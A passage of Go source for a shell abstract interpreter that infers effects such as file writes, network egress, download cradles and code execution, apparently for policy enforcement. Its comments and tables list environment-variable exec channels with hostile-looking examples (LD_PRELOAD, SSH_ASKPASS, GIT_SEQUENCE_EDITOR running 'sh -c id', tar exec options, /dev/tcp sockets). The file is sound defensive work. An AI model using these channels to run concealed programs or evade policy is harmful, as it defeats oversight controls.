package bash

import (
	"fmt"
	"path"
	"sort"
	"strconv"
	"strings"

	"mvdan.cc/sh/v3/expand"
	"mvdan.cc/sh/v3/syntax"

	"github.com/v0lka/flowsh/engine"
)

// ===========================================================================
// The abstract-execution layer
// ===========================================================================
//
// This file implements the transfer functions of the shell frontend: it walks
// the syntax tree with an abstract state Σ (see expand.go), expanding words,
// interpreting redirections, pipelines, control-flow and subshells, and folds
// the effects it discovers into a single aggregate.
//
// Two design points are worth stating up front.
//
//   - Effects of ordinary commands are obtained through the Resolver seam. The
//     binding layer (package bind) already knows how to turn a normalized
//     command invocation into effects, but it imports this package, so this
//     package cannot import it back. The seam inverts that dependency: the
//     caller injects the binder. Everything the shell itself contributes —
//     redirections, code-execution sinks, environment writes — is emitted here
//     directly.
//
//   - The analysis is bounded. Whenever it cannot finish (a loop whose
//     condition never becomes false, an undecidable branch taken to its limit)
//     it degrades to ⊤ rather than diverge, and it does so within a fixed
//     step budget so the wall-clock cost is bounded.

// Resolution is the outcome of resolving one command invocation through the
// Resolver seam: the effects the command contributes together with the
// derivations that justify each of them (the concrete flag/operand/source atoms
// the effect rests on). Threading both lets the composition layer build a
// why-trace that reaches all the way down to the knowledge base.
type Resolution struct {
	Effects     []engine.Effect
	Derivations []engine.Derivation
}

// Resolver is the seam through which the effect knowledge base is injected: it
// maps one normalized, fully-expanded command invocation to the effects it
// implies and to the derivations that justify them. Passing nil disables command
// binding — only the shell's own intrinsic effects are then reported.
type Resolver func(cmd *Command, prog *Program) Resolution

// ExecResult is the outcome of abstractly executing a shell program: the
// aggregate effect set, the final abstract state, the resolved invocations, and
// the ⊤ flags.
type ExecResult struct {
	Variant Variant `json:"variant"`
	File    string  `json:"file,omitempty"`
	Source  string  `json:"source"`

	// Top is true when the whole analysis degraded to ⊤ (a parse failure or an
	// exhausted budget); Reason explains why.
	Top    bool   `json:"top"`
	Reason string `json:"reason,omitempty"`

	// Conservative is true when the aggregate includes a ⊤ effect (CodeExec
	// over the any-target scope) even though the program as a whole was
	// analysed — e.g. because it feeds data to a code-execution sink.
	Conservative bool `json:"conservative"`

	Effects         []engine.Effect        `json:"effects"`
	Destructiveness engine.Destructiveness `json:"destructiveness"`

	// Derivations justifies every reported effect with the concrete source atoms
	// (flags, operands, redirections, sinks) it rests on, for the composition
	// layer's why-trace. It is analysis metadata, not part of the effect IR.
	Derivations []engine.Derivation `json:"-"`

	State *State     `json:"state,omitempty"`
	Cmds  []*Command `json:"cmds,omitempty"`
	Notes []string   `json:"notes,omitempty"`
}

// HasTop reports whether the aggregate effects include the ⊤ effect (CodeExec
// acting on the any-target scope).
func (r *ExecResult) HasTop() bool {
	if r == nil {
		return false
	}
	for _, e := range r.Effects {
		if isTopEffect(e) {
			return true
		}
	}
	return false
}

// ===========================================================================
// Bounds
// ===========================================================================

const (
	// defaultBudget bounds the number of interpreted steps: redirections,
	// statements, loop iterations and function calls all draw on it. When it is
	// exhausted the analysis yields ⊤, which is what makes "while true" cheap.
	defaultBudget = 50000
	// maxFuncDepth bounds function-call recursion.
	maxFuncDepth = 64
	// maxAliasDepth bounds alias-chain expansion.
	maxAliasDepth = 32
	// maxFindDepth bounds the nesting of `find … -exec find …` payloads, so a
	// self-similar action cannot recurse without bound.
	maxFindDepth = 8
	// maxRecorded bounds the resolved-invocation and note lists so that a
	// non-terminating loop cannot grow them without limit before the budget
	// stops it.
	maxRecorded = 1024
)

// Control-flow signals, propagated by execStmts until a loop or function
// consumes them.
const (
	ctlNone = iota
	ctlBreak
	ctlContinue
	ctlReturn
	ctlExit
)

// budgetError unwinds the interpreter when the step budget runs out.
type budgetError struct{ detail string }

// ===========================================================================
// Interpreter
// ===========================================================================

// interp is one abstract execution of a program.
type interp struct {
	src  string
	prog *Program
	norm *normalizer
	res  Resolver

	state  *State
	effs   []engine.Effect
	ders   []engine.Derivation
	cmds   []*Command
	notes  []string
	top    bool
	reason string

	budget int
	depth  int
	// loopDepth counts the enclosing loops; a break/continue is only consumed
	// when it is > 0, so an unconsumed loop-control builtin is ignored (as bash
	// does) instead of silently abandoning the rest of the statement list.
	loopDepth int

	// stdout/stdin fold the value flowing out of, and into, the command
	// currently being interpreted; they are what threads a pipeline. The
	// matching *Taint fields thread its provenance through the same channel.
	stdout      string
	stdoutKnown bool
	stdoutTaint engine.Taint
	stdin       string
	stdinKnown  bool
	stdinTaint  engine.Taint
	// stdinNet records that the value flowing into the current command came,
	// this pipeline, from a network egress (a NetEgress stage upstream). It is
	// the flow evidence for a download cradle: a code-execution sink fed by
	// network content. It is threaded alongside stdin/stdinTaint.
	stdinNet bool

	// status/statusKnown record the exit status of the last command, when the
	// analysis can pin it down; they decide && / || / if / while branches.
	status      int
	statusKnown bool

	// ctl is the pending control-flow signal.
	ctl int

	// subst records the stdout (and its knownness) captured for every command
	// and process substitution node encountered during expansion.
	subst map[syntax.Node]substInfo

	// substDone records the substitution nodes already executed for the
	// statement currently being interpreted, so a word's pre-scan and the
	// expander's own hook run each substitution exactly once (Findings 37/74).
	substDone map[syntax.Node]bool

	// stdinFed records that the statement's standard input is fed real data — a
	// heredoc, a here-string, a redirection from a file or the previous pipeline
	// stage — as opposed to being empty or closed. A program that reads a
	// command language from its input is only a code sink when it is fed
	// (Finding 60).
	stdinFed bool

	// pendingEgress records the effect indexes of the socket redirections this
	// statement emitted (/dev/tcp, /dev/udp). Their payload is the command's
	// output, whose provenance is only known after the command has been bound,
	// so the taint is joined onto them at the end of the statement (Finding 23).
	pendingEgress []int

	// socketFD maps a file descriptor to the socket endpoint a `exec 3<>/dev/tcp/…`
	// redirection bound it to, so a later `>&3` is reported as the egress it
	// really is (Finding 23).
	socketFD map[string]string

	// stmtRedirs accumulates the resolved redirections of the statement
	// currently executing; cmdRedirs is the snapshot taken once the statement's
	// own redirections are done, which the command dispatched by that statement
	// carries on Command.Redirs. Both are saved/restored around each statement
	// so nested statements (a command substitution expanding its own redirects)
	// can never leak into an enclosing command's view.
	stmtRedirs []ExecRedirect
	cmdRedirs  []ExecRedirect

	// substMemo/procMemo memoise the substitution side effects already performed
	// within the statement currently being interpreted, so that a word whose
	// substitutions are expanded twice — a `[[ … ]]` clause is walked once by
	// expandSubstsIn and again by testFileReads — runs each substitution only
	// once. They are non-nil only while such a clause is being executed.
	substMemo map[*syntax.CmdSubst]substInfo
	procMemo  map[*syntax.ProcSubst]bool

	// funcRaw holds the raw bodies of the program's functions, so the
	// interpreter can execute them.
	funcRaw map[string]*syntax.FuncDecl

	// hashTable is the shell's command-hash table: the name → path bindings
	// `hash -p PATH NAME` installs. bash resolves a hashed name before it
	// searches PATH, so a hashed invocation runs the recorded binary and not
	// the knowledge-base row of the name (Finding 76). An entry whose path is
	// empty is a binding the analysis cannot resolve: the named invocation must
	// then degrade to ⊤ rather than bind the name's own row.
	hashTable map[string]string
	// hashOpaque records a `hash -p` whose NAME operand is not statically
	// known: any name may then have been rebound, so name resolution itself is
	// no longer bounded.
	hashOpaque bool
	// hashOpaqueWhy names the construct that made name resolution unprovable,
	// so the ⊤ effect's reason names the real cause (a `hash -p`, a `PATH`
	// assignment, a write to `BASH_CMDS`).
	hashOpaqueWhy string
	// aliasOpaque records an `alias`/`unalias` whose operand is not statically
	// known: the alias table may then differ from the analysed one in a way the
	// analysis cannot reconstruct, so an alias-body expansion is not bounded.
	aliasOpaque bool
	// staged is the set of path keys (engine.PathKey) an earlier command wrote
	// with credential material, so a later read of one is a secret source and
	// the upload that follows pairs with it (Finding 94). It persists across
	// statements, in execution order, and is never narrowed.
	staged map[string]bool
	// findDepth bounds the nesting of find(1) exec payloads.
	findDepth int
}

// newInterpVars builds an interpreter whose abstract state is additionally
// seeded with vars: name→value bindings the embedding host knows from its own
// context (a session temp directory, a workspace path, …) that the script text
// alone does not determine. Each binding becomes a set, statically-known
// variable, so later $name reads resolve exactly like a literal in-script
// assignment would have made them. Seeding never weakens a variable the shell
// model already knows: an empty name and a readonly collision (the seeded
// status parameters) are skipped. A nil/empty table reproduces the plain
// interpreter state.
func newInterpVars(src string, prog *Program, r Resolver, f *syntax.File, vars map[string]string) *interp {
	it := &interp{
		src:       src,
		prog:      prog,
		norm:      newNormalizer(src),
		res:       r,
		state:     NewState(),
		budget:    defaultBudget,
		subst:     map[syntax.Node]substInfo{},
		funcRaw:   collectFuncsRaw(f),
		hashTable: map[string]string{},
		staged:    map[string]bool{},
	}
	for name, value := range vars {
		if name == "" {
			continue
		}
		if v := it.state.Get(name); v != nil && v.Readonly {
			continue
		}
		it.state.SetKnown(name, value, engine.TaintBottom())
	}
	if prog != nil {
		for n, fn := range prog.Funcs {
			it.state.Funcs[n] = fn
		}
		// Aliases are intentionally NOT preloaded: bash applies an alias only
		// from the point it is declared, so they are installed by the `alias`
		// builtin as the program executes (see builtinState). Preloading them
		// would let a later declaration rewrite an earlier use.
	}
	return it
}

// collectFuncsRaw indexes every function definition in the raw syntax tree.
func collectFuncsRaw(f *syntax.File) map[string]*syntax.FuncDecl {
	out := map[string]*syntax.FuncDecl{}
	if f == nil {
		return out
	}
	syntax.Walk(f, func(n syntax.Node) bool {
		if fd, ok := n.(*syntax.FuncDecl); ok && fd.Name != nil {
			out[fd.Name.Value] = fd
		}
		return true
	})
	return out
}

// step charges one unit against the budget and unwinds with budgetError when it
// is exhausted.
func (it *interp) step() {
	it.budget--
	if it.budget <= 0 {
		panic(budgetError{"step budget exhausted"})
	}
}

// resolutionProgram returns the program handed to the resolver, restricted to
// the aliases declared so far. bash applies an alias only from the point it is
// declared, so a declaration that runs after a use (or never runs) must not
// rewrite that use; the interpreter installs aliases as the `alias` builtin
// executes, and this view keeps the binder's own alias resolution in step.
func (it *interp) resolutionProgram() *Program {
	if it.prog == nil || len(it.prog.Aliases) == 0 {
		return it.prog
	}
	p := *it.prog
	p.Aliases = make(map[string]*Alias, len(it.state.Aliases))
	for n, v := range it.state.Aliases {
		p.Aliases[n] = &Alias{Name: n, Value: v}
	}
	return &p
}

// resolutionProgramExcluding returns the resolver's view of the program with
// the named alias suppressed. bash expands an alias only for an UNQUOTED
// command word, so a quoted or backslash-escaped name must resolve as the real
// command even when the alias table holds a body for it (Finding 78).
func (it *interp) resolutionProgramExcluding(name string) *Program {
	p := it.resolutionProgram()
	if p == nil {
		return nil
	}
	if _, ok := p.Aliases[name]; !ok {
		return p
	}
	cp := *p
	cp.Aliases = make(map[string]*Alias, len(p.Aliases))
	for n, a := range p.Aliases {
		if n == name {
			continue
		}
		cp.Aliases[n] = a
	}
	return &cp
}

// ===========================================================================
// Entry point
// ===========================================================================

// Exec parses src as variant v and abstractly executes it, returning the
// aggregate effect set and the final state. r is the effect resolver (nil means
// no command binding). Exec never panics: a parse failure, an internal error, or
// an exhausted budget all degrade to a ⊤ result.
func Exec(v Variant, name, src string, r Resolver) (res *ExecResult) {
	return execVars(v, name, src, r, nil)
}

// execVars is Exec with an optional host-supplied set of variable bindings
// seeded into the initial abstract state (nil/empty reproduces Exec).
func execVars(v Variant, name, src string, r Resolver, vars map[string]string) (res *ExecResult) {
	var it *interp
	defer func() {
		if rec := recover(); rec != nil {
			if it != nil {
				res = it.finish(rec)
				return
			}
			res = topResult(v, name, src, fmt.Sprintf("internal failure: %v", rec))
		}
	}()

	lang, ok := v.langVariant()
	if !ok {
		return topResult(v, name, src, "unknown shell variant "+strconv.Quote(string(v)))
	}
	if nestingTooDeep(src) {
		return topResult(v, name, src, "input nesting too deep")
	}
	parser := syntax.NewParser(syntax.Variant(lang))
	f, err := parser.Parse(strings.NewReader(src), name)
	if err != nil {
		return topResult(v, name, src, err.Error())
	}
	syntax.Simplify(f)

	prog := &Program{Variant: v, File: name, Source: src, Stmts: []*Stmt{}}
	newNormalizer(src).fill(f, prog)

	it = newInterpVars(src, prog, r, f, vars)
	it.execStmts(f.Stmts)
	return it.result()
}

// ExecWithVars is Exec with the abstract state pre-seeded from vars: host-known
// variable bindings (a session temp directory, …) resolved before the first
// statement runs, as though the script had assigned them literally. See
// newInterpVars for the seeding semantics.
func ExecWithVars(v Variant, name, src string, r Resolver, vars map[string]string) (res *ExecResult) {
	return execVars(v, name, src, r, vars)
}

// ExecBash is Exec for the bash dialect.
func ExecBash(src string, r Resolver) *ExecResult { return Exec(Bash, "script", src, r) }

// topResult builds a fully-⊤ result.
func topResult(v Variant, name, src, reason string) *ExecResult {
	rep := engine.NewReport()
	rep.Effects = []engine.Effect{topEffect(engine.ModeDirect)}
	rep.Normalize()
	return &ExecResult{
		Variant:         v,
		File:            name,
		Source:          src,
		Top:             true,
		Reason:          reason,
		Conservative:    true,
		Effects:         rep.Effects,
		Destructiveness: rep.Destructiveness,
		State:           NewState(),
		Notes:           []string{reason},
	}
}

// finish turns a recovered panic into a ⊤ result, preserving whatever effects
// were discovered before the unwinding.
func (it *interp) finish(rec interface{}) *ExecResult {
	if b, ok := rec.(budgetError); ok {
		it.markTop("analysis budget exhausted: " + b.detail)
	} else {
		it.markTop(fmt.Sprintf("internal failure: %v", rec))
	}
	return it.result()
}

// result folds the accumulated effects into their canonical form.
func (it *interp) result() *ExecResult {
	rep := engine.NewReport()
	rep.Effects = it.effs
	rep.Normalize()

	cons := it.top
	for _, e := range rep.Effects {
		if isTopEffect(e) {
			cons = true
		}
	}
	// The JSON contract requires `reason` whenever `conservative` or `top` is
	// set: a result made conservative by an ordinary ⊤ effect (rather than by
	// markTop) still needs an explanation.
	reason := it.reason
	if cons && reason == "" {
		reason = "analysis includes an unbounded (⊤) effect"
	}
	return &ExecResult{
		Variant:         it.prog.Variant,
		File:            it.prog.File,
		Source:          it.prog.Source,
		Top:             it.top,
		Reason:          reason,
		Conservative:    cons,
		Effects:         rep.Effects,
		Destructiveness: rep.Destructiveness,
		Derivations:     it.ders,
		State:           it.state,
		Cmds:            it.cmds,
		Notes:           dedupStrings(it.notes),
	}
}

// markTop flags the whole analysis as ⊤ and records a ⊤ effect.
func (it *interp) markTop(reason string) {
	if !it.top {
		it.top, it.reason = true, reason
	}
	it.addNote(reason)
	it.effs = append(it.effs, topEffect(engine.ModeDirect))
}

// markTopEffect records a ⊤ effect for one sub-computation (a sink) without
// claiming the whole program is unanalysable. It returns the effect so the
// caller can attach a derivation citing the construct that produced it.
func (it *interp) markTopEffect(reason string) engine.Effect {
	return it.markTopEffectFlow(reason, engine.FlowNone)
}

// markTopEffectFlow is markTopEffect with an explicit network-flow role: a ⊤
// code execution that is the sink of a network data flow (FlowCradle) is
// recorded as such, so the report can assert the download-cradle flow rather
// than leave it to be inferred from co-occurrence.
func (it *interp) markTopEffectFlow(reason string, flow engine.FlowRole) engine.Effect {
	it.addNote(reason)
	e := topEffect(engine.ModeDirect)
	e.NetFlow = flow
	it.effs = append(it.effs, e)
	return e
}

// taintIsNetwork reports whether a value's provenance marks it as content that
// arrived over the network: it carries the network label, or its provenance is
// unknown (⊤), which conservatively includes network content.
//
// "Untrusted" is deliberately not network content. Every command substitution
// is untrusted — it is the output of code the analysis did not itself run —
// whether it fetched a URL or read a local file, so treating untrusted as
// network content asserted a download cradle for `sh -c "$(cat local.txt)"`
// (see code review #4). The network label is attached where the analysis
// actually established the flow: the pipeline's value flow (stdinNet) and a
// substitution whose body performed a network effect (substInfo.net).
func taintIsNetwork(t engine.Taint) bool {
	return t.IsTop() || t.Contains(engine.TaintNetwork)
}

// sinkFlowRole returns the network-flow role of a code-execution sink fed by
// the current value flow: FlowCradle when the sink consumes network content
// (the pipeline's upstream stages contain a network egress, or the value
// flowing in — via standard input or a command-substitution argument — carries
// the network provenance label), and FlowNone otherwise. A sink fed only
// untrusted-but-local data (a local file read, stdin) is not a cradle.
func (it *interp) sinkFlowRole(cmd *Command) engine.FlowRole {
	if it.stdinNet || taintIsNetwork(it.stdinTaint) {
		return engine.FlowCradle
	}
	if cmd != nil {
		for _, a := range cmd.Args {
			if a != nil && taintIsNetwork(a.Taint) {
				return engine.FlowCradle
			}
		}
	}
	return engine.FlowNone
}

// ===========================================================================
// Effects
// ===========================================================================

func topEffect(mode engine.EffectMode) engine.Effect {
	return engine.Effect{
		Kind:       engine.KindCodeExec,
		Target:     engine.ScopeTop(),
		Mode:       mode,
		Certainty:  engine.CertaintyCertain,
		Taint:      engine.TaintBottom(),
		Reversible: false,
	}
}

func isTopEffect(e engine.Effect) bool {
	return e.Kind == engine.KindCodeExec && e.Target.IsTop()
}

// execEnvVars are the environment variables whose *value* the runtime executes
// (Finding 45). The list covers the documented option channels of interpreters
// and loaders, the helper-program channels of the network clients, and the
// shell's own startup hook: `JAVA_TOOL_OPTIONS=-agentlib:jdwp=…`,
// `LD_PRELOAD=/tmp/x.so`, `SSH_ASKPASS=/tmp/evil`, `RSYNC_RSH=/tmp/evil`,
// `GIT_SSH_COMMAND=…`, `BASH_ENV=/tmp/x.sh` each run a program (or open an
// unauthenticated debug listener) although the assignment itself looks inert.
var execEnvVars = map[string]bool{
	"JAVA_TOOL_OPTIONS": true,
	"_JAVA_OPTIONS":     true,
	"JDK_JAVA_OPTIONS":  true,
	"LD_PRELOAD":        true,
	"LD_AUDIT":          true,
	"SSH_ASKPASS":       true,
	"RSYNC_RSH":         true,
	"GIT_SSH_COMMAND":   true,
	"GIT_SSH":           true,
	"GIT_EXTERNAL_DIFF": true,
	"GIT_PAGER":         true,
	"GIT_EDITOR":        true,
	"PAGER":             true,
	"MANPAGER":          true,
	"EDITOR":            true,
	"VISUAL":            true,
	"BASH_ENV":          true,
	"ENV":               true,
	"PERL5OPT":          true,
	"RUBYOPT":           true,
	"NODE_OPTIONS":      true,
	"LESSOPEN":          true,
	"PROMPT_COMMAND":    true,
	// The remaining documented helper-program channels (F45 extension, pass
	// 58): each names a program the tool runs at a point the command line does
	// not show. `GIT_SEQUENCE_EDITOR='sh -c id' git rebase -i`,
	// `GIT_ASKPASS=/tmp/e git fetch`, `SUDO_ASKPASS=/tmp/e sudo -A id`,
	// `SYSTEMD_EDITOR=/tmp/e systemctl edit u` and
	// `KUBECTL_EXTERNAL_DIFF=/tmp/e kubectl diff` all executed a program while
	// the report stayed a bounded EnvWrite, so a code-execution-denying policy
	// allowed them.
	"GIT_SEQUENCE_EDITOR":   true,
	"GIT_ASKPASS":           true,
	"GIT_PROXY_COMMAND":     true,
	"SUDO_ASKPASS":          true,
	"SYSTEMD_EDITOR":        true,
	"KUBECTL_EXTERNAL_DIFF": true,
	// GIT_CONFIG_COUNT/KEY_n/VALUE_n (and the older GIT_CONFIG_PARAMETERS)
	// carry git configuration through the environment, exactly as `git -c
	// key=value` does. The key is a separate variable's value, so which setting
	// it names cannot be resolved statically — and an exec-bearing setting
	// (core.pager, core.editor, core.sshCommand, core.askPass, diff.external)
	// would run a program. The whole channel is therefore a code-execution sink.
	"GIT_CONFIG_PARAMETERS": true,
}

// gitConfigEnvPrefix is the family GIT_CONFIG_COUNT/GIT_CONFIG_KEY_<n>/
// GIT_CONFIG_VALUE_<n>: git's environment configuration channel (F45 extension).
const gitConfigEnvPrefix = "GIT_CONFIG_"

// optionChannelEnvVars are environment variables whose value is not a program
// but a list of *options* the tool applies to its own invocation. A value the
// analysis cannot resolve may name an exec-bearing option, and a resolvable one
// is inspected for exactly those options (F45 extension).
var optionChannelEnvVars = map[string]bool{
	"TAR_OPTIONS": true,
}

// tarExecOptions are the tar options that run a program, in the spellings
// `TAR_OPTIONS` accepts. They are the env twin of the option-level declarations
// Findings 32/44/80 pin (`--rsh-command`, `--to-command`, `-I`, `-F`).
var tarExecOptions = []string{
	"--to-command", "--rsh-command", "--use-compress-program",
	"--info-script", "--new-volume-script", "--checkpoint-action=exec",
	"-I", "-F",
}

// execOptionChannel reports whether an assignment to an option-channel variable
// makes the runtime execute a program: an unresolved value may name an exec
// option, and a resolved one is searched for the documented exec options.
func execOptionChannel(name, val string, known bool) bool {
	if !optionChannelEnvVars[name] {
		return false
	}
	if !known {
		return true
	}
	for _, opt := range tarExecOptions {
		if strings.Contains(val, opt) {
			return true
		}
	}
	return false
}

// ExecEnvVar reports whether an assignment to name reaches the
// code-execution channel: a program-valued variable, an option channel, or
// git's environment configuration family. It is the single source of truth
// shared by the shell's own assignment channels (a prefix assignment, an `env`
// operand, an `export`) and the binder's copy of them, through ExecEnvEffect.
func ExecEnvVar(name string) bool {
	return execEnvVars[name] || optionChannelEnvVars[name] ||
		strings.HasPrefix(name, gitConfigEnvPrefix)
}

// ExecEnvEffect builds the code-execution effect an assignment to an
// exec-bearing variable implies. The assigned program is named when the value
// is a statically known path; an option string (`-agentlib:…`) or a dynamic
// value leaves the subject unresolved (⊤). Clearing the variable (`VAR=`) runs
// nothing. It is the exported entry point of the channel ExecEnvVar denotes, so
// a caller that holds a normalized assignment — the binder's copy of the shell's
// assignment channels — lowers it with the same rules instead of re-deriving
// them.
func ExecEnvEffect(name, val string, known bool, taint engine.Taint) (engine.Effect, bool) {
	if !ExecEnvVar(name) {
		return engine.Effect{}, false
	}
	if known && val == "" {
		// Clearing either channel runs nothing.
		return engine.Effect{}, false
	}
	// An option channel and git's environment configuration name no program of
	// their own: the executed subject is whatever the option or the setting
	// names, which the command line (and therefore the analysis) does not show.
	// An unresolved option channel is treated the same way, because the value it
	// holds cannot be inspected.
	if optionChannelEnvVars[name] {
		if !execOptionChannel(name, val, known) {
			return engine.Effect{}, false
		}
		return engine.Effect{
			Kind:       engine.KindCodeExec,
			Target:     engine.ScopeTop(),
			Mode:       engine.ModeDirect,
			Certainty:  engine.CertaintyCertain,
			Taint:      taint,
			Reversible: false,
		}, true
	}
	if strings.HasPrefix(name, gitConfigEnvPrefix) {
		return engine.Effect{
			Kind:       engine.KindCodeExec,
			Target:     engine.ScopeTop(),
			Mode:       engine.ModeDirect,
			Certainty:  engine.CertaintyCertain,
			Taint:      taint,
			Reversible: false,
		}, true
	}
	target := engine.ScopeTop()
	if known && val != "" && !strings.HasPrefix(val, "-") {
		// The value names the program (a path or a bare command name). An
		// option string (-agentlib:…) names no subject of its own.
		target = engine.ScopeOf(val)
	}
	return engine.Effect{
		Kind:       engine.KindCodeExec,
		Target:     target,
		Mode:       engine.ModeDirect,
		Certainty:  engine.CertaintyCertain,
		Taint:      taint,
		Reversible: false,
	}, true
}

func envWriteEffect(name string, taint engine.Taint) engine.Effect {
	return engine.Effect{
		Kind:       engine.KindEnvWrite,
		Target:     engine.ScopeOf(name),
		Mode:       engine.ModeDirect,
		Certainty:  engine.CertaintyCertain,
		Taint:      taint,
		Reversible: false,
	}
}

func (it *interp) emit(kind engine.EffectKind, target engine.Scope, mode engine.EffectMode, cert engine.Certainty, taint engine.Taint, atom engine.Atom) {
	e := engine.Effect{
		Kind:       kind,
		Target:     target,
		Mode:       mode,
		Certainty:  cert,
		Taint:      taint,
		Reversible: defaultReversible(kind),
	}
	it.effs = append(it.effs, e)
	it.derive(e, atom)
}

// derive records why one effect follows from the given source atoms. It is the
// interpreter's counterpart of the binder's derivations: the shell's intrinsic
// effects (redirections, stdio, sinks, environment writes) each cite a redirect,
// literal or command atom, so that every effect has a concrete justification.
func (it *interp) derive(e engine.Effect, atoms ...engine.Atom) {
	if len(atoms) == 0 {
		return
	}
	it.ders = append(it.ders, engine.Derivation{
		Effect: e,
		Atoms:  atoms,
		Rules:  []string{intrinsicRule(e.Kind)},
	})
}

// intrinsicRule names the rule the shell itself fires for an intrinsic effect
// kind; it mirrors the binder's rule vocabulary so the two read alike.
func intrinsicRule(k engine.EffectKind) string {
	switch k {
	case engine.KindFSRead:
		return "fs.read"
	case engine.KindFSWrite:
		return "fs.write"
	case engine.KindFSMeta:
		return "fs.meta"
	case engine.KindEnvWrite:
		return "env.write"
	case engine.KindNetEgress:
		return "net.egress"
	case engine.KindNetIngress:
		return "net.ingress"
	case engine.KindIPC:
		return "ipc"
	case engine.KindStdio:
		return "stdio"
	case engine.KindCodeExec:
		return "code.exec"
	default:
		return "effect.derive"
	}
}

// sourceLoc converts a frontend position into the core's source location,
// returning nil when the position carries no information.
func sourceLoc(p Pos, file string) *engine.SourceLoc {
	if p.IsZero() && file == "" {
		return nil
	}
	return &engine.SourceLoc{File: file, Line: p.Line, Col: p.Col}
}

// redirectAtom builds the redirect atom a redirection effect cites.
func (it *interp) redirectAtom(p Pos, text string) engine.Atom {
	return engine.Atom{Kind: engine.AtomRedirect, Text: text, Loc: sourceLoc(p, it.prog.File)}
}

// defaultReversible mirrors the core's default reversibility per kind.
func defaultReversible(k engine.EffectKind) bool {
	switch k {
	case engine.KindFSRead, engine.KindEnvRead, engine.KindNetIngress,
		engine.KindNetEgress, engine.KindStdio, engine.KindCredAccess:
		return true
	default:
		return false
	}
}

// ===========================================================================
// Statement execution
// ===========================================================================

func (it *interp) execStmts(ss []*syntax.Stmt) {
	for _, s := range ss {
		if it.ctl != ctlNone {
			// A control-flow signal that no enclosing construct can consume is a
			// no-op in bash (only `exit` is terminal everywhere): reset it and
			// keep executing, so a stray break/continue/return cannot suppress
			// the rest of the statement list.
			switch it.ctl {
			case ctlExit:
				return
			case ctlReturn:
				if it.depth == 0 {
					it.addNote("return outside a function; ignored")
					it.ctl = ctlNone
					break
				}
				return
			default: // ctlBreak, ctlContinue
				if it.loopDepth == 0 {
					it.addNote("loop-control builtin outside a loop; ignored")
					it.ctl = ctlNone
					break
				}
				return
			}
		}
		it.execStmt(s)
	}
}

func (it *interp) execStmt(s *syntax.Stmt) {
	if s == nil {
		return
	}
	it.step()
	// Finding 94: the statement's own effects — including the redirections
	// processed below, which run before the command is bound — are the unit
	// across which credential material is staged (a read of a credential the
	// statement writes into a file) and read back (a read of a file an earlier
	// statement staged). The pass runs at statement end, once every effect of
	// the statement is known, and the egress join is re-run over the whole
	// slice so an upload of a staged file pairs exactly like an upload of the
	// credential itself.
	effStart := len(it.effs)
	defer func() {
		engine.ApplySecretStaging(it.effs[effStart:], it.staged)
		it.taintEgressWithSecret(effStart, engine.TaintBottom())
	}()
	// Reset the exit status so a stale value from an earlier statement can never
	// leak into a condition or an && / || operand of this one. Statements that
	// compute no status (a bare assignment, a declaration, a function
	// definition) leave it unknown, so both branches of a dependent operator are
	// explored — conservative, never a miss.
	it.status, it.statusKnown = 0, false
	// An input redirection contributes the provenance of the file it reads to
	// this statement's standard input; the contribution is scoped to the
	// statement so it cannot leak into a following one.
	savedInTaint, savedInFed := it.stdinTaint, it.stdinFed
	// The resolved redirections of this statement feed the command it dispatches
	// (Command.Redirs); they are scoped the same way, so a nested statement —
	// a command substitution expanding redirects of its own — can never leak
	// into the enclosing command's view.
	savedStmtRedirs, savedCmdRedirs := it.stmtRedirs, it.cmdRedirs
	// Substitution execution and socket-sink bookkeeping are per statement too:
	// a substitution is executed once per statement, and a /dev/tcp sink is
	// tainted at the end of the statement that opened it.
	savedDone, savedEgress := it.substDone, it.pendingEgress
	defer func() {
		it.stdinTaint, it.stdinFed = savedInTaint, savedInFed
		it.stmtRedirs, it.cmdRedirs = savedStmtRedirs, savedCmdRedirs
		it.substDone, it.pendingEgress = savedDone, savedEgress
	}()
	it.stmtRedirs = nil
	it.substDone = map[syntax.Node]bool{}
	it.pendingEgress = nil
	for _, r := range s.Redirs {
		it.redir(r)
	}
	it.cmdRedirs = it.stmtRedirs
	if s.Cmd == nil {
		return
	}
	if s.Background || s.Coprocess {
		saved := it.state
		savedCtl := it.ctl
		it.state = it.state.Clone()
		// A background job (or coprocess) runs in its own subshell: a
		// control-flow signal it raises must not escape to the enclosing
		// statement list.
		it.ctl = ctlNone
		it.execCommand(s.Cmd)
		it.state = saved
		it.ctl = savedCtl
		// Launching a job succeeds regardless of the job's own exit status.
		it.status, it.statusKnown = 0, true
		it.applyEgressTaint()
		return
	}
	it.execCommand(s.Cmd)
	// The command's output is what a socket redirection of this statement
	// carries; now that the command has been bound, join that provenance onto
	// the sink it fed (Finding 23).
	it.applyEgressTaint()
	// `! cmd` inverts the command's exit status (bash semantics), which decides
	// the reachable branch of a following if / && / || / while.
	if s.Negated && it.statusKnown {
		if it.status == 0 {
			it.status = 1
		} else {
			it.status = 0
		}
	}
}

func (it *interp) execCommand(c syntax.Command) {
	switch c := c.(type) {
	case nil:
		// bare redirection
	case *syntax.CallExpr:
		it.execCall(c)
	case *syntax.BinaryCmd:
		it.execBinary(c)
	case *syntax.Block:
		it.execStmts(c.Stmts)
	case *syntax.Subshell:
		saved := it.state
		savedCtl := it.ctl
		it.state = it.state.Clone()
		// A subshell runs in its own shell: a control-flow signal it raises must
		// be confined to it, never abort the enclosing statement list.
		it.ctl = ctlNone
		it.execStmts(c.Stmts)
		it.state = saved
		it.ctl = savedCtl
	case *syntax.IfClause:
		it.execIf(c)
	case *syntax.WhileClause:
		it.execWhile(c)
	case *syntax.ForClause:
		it.execFor(c)
	case *syntax.CaseClause:
		it.execCase(c)
	case *syntax.FuncDecl:
		it.execFuncDecl(c)
	case *syntax.DeclClause:
		it.execDecl(c)
	case *syntax.TimeClause:
		if c.Stmt != nil {
			it.execStmt(c.Stmt)
		}
	case *syntax.CoprocClause:
		saved := it.state
		savedCtl := it.ctl
		it.state = it.state.Clone()
		it.ctl = ctlNone
		if c.Stmt != nil {
			it.execStmt(c.Stmt)
		}
		it.state = saved
		it.ctl = savedCtl
	case *syntax.ArithmCmd:
		// Walk the expression so any command/process substitution inside it is
		// executed (its effects recorded); the command's own status is unknown.
		it.expandSubstsIn(c)
		// `((x=$(cmd)))` also assigns the value to x, so the variable carries the
		// substituted data's provenance (Finding 61).
		it.arithmAssignTaint(c.X)
		it.status, it.statusKnown = 0, false
	case *syntax.TestClause:
		// A `[[ … ]]` clause expands each of its words twice — once by
		// expandSubstsIn (to run any command/process substitution) and again by
		// testFileReads (to resolve the file-test operand). Memoise within this
		// clause so each substitution's effects run exactly once.
		substMemo, procMemo := it.substMemo, it.procMemo
